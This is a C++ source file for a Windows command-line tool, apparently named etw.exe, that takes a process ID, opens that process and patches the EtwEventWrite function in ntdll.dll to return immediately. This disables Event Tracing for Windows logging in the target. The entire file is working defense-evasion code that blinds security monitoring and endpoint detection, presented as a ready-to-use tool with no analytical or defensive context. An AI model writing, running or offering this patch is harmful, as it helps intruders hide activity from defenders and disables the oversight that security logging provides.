#include <Windows.h>
#include <iostream>
#include <string>

// Function to patch EtwEventWrite in the specified process
void PatchEtwEventWrite(DWORD processId) {
    // Open the target process with necessary access rights
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        std::cerr << "Failed to open process: " << GetLastError() << std::endl;
        return;
    }

    // Load the ntdll.dll module in the current process
    HMODULE hModule = GetModuleHandleA("ntdll.dll");
    if (!hModule) {
        std::cerr << "Failed to get module handle for ntdll.dll: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Dynamically find the address of EtwEventWrite in the current process
    FARPROC pEventWritePtr = GetProcAddress(hModule, "EtwEventWrite");
    if (!pEventWritePtr) {
        std::cerr << "Failed to get address for EtwEventWrite: " << GetLastError() << std::endl;
        CloseHandle(hProcess);
        return;
    }

    // Patch the EtwEventWrite function in the remote process
#ifdef _WIN64
    // 64-bit patch: Replace EtwEventWrite with no-op (xor rax, rax; ret)
    BYTE patch64[] = { 0x48, 0x33, 0xC0, 0xC3 }; // xor rax, rax; ret
    SIZE_T bytesWritten;
    if (WriteProcessMemory(hProcess, (LPVOID)pEventWritePtr, patch64, sizeof(patch64), &bytesWritten)) {
        std::cout << "64-bit memory patched successfully!" << std::endl;
    }
    else {
        std::cerr << "Error patching 64-bit memory: " << GetLastError() << std::endl;
    }
#else
    // 32-bit patch: Replace EtwEventWrite with no-op (xor eax, eax; ret 14)
    BYTE patch32[] = { 0x33, 0xC0, 0xC2, 0x14, 0x00 }; // xor eax, eax; ret 14
    SIZE_T bytesWritten;
    if (WriteProcessMemory(hProcess, (LPVOID)pEventWritePtr, patch32, sizeof(patch32), &bytesWritten)) {
        std::cout << "32-bit memory patched successfully!" << std::endl;
    }
    else {
        std::cerr << "Error patching 32-bit memory: " << GetLastError() << std::endl;
    }
#endif

    // Close the handle to the target process
    CloseHandle(hProcess);
}

int main(int argc, char* argv[]) {
    if (argc != 2) {
        std::cerr << "Usage: etw.exe <PID>" << std::endl;
        return 1;
    }

    // Parse the PID from the command-line argument
    DWORD processId = std::stoi(argv[1]);

    // Call the patch function on the specified process
    PatchEtwEventWrite(processId);

    std::cout << "After ETW Patch" << std::endl;

    return 0;
}
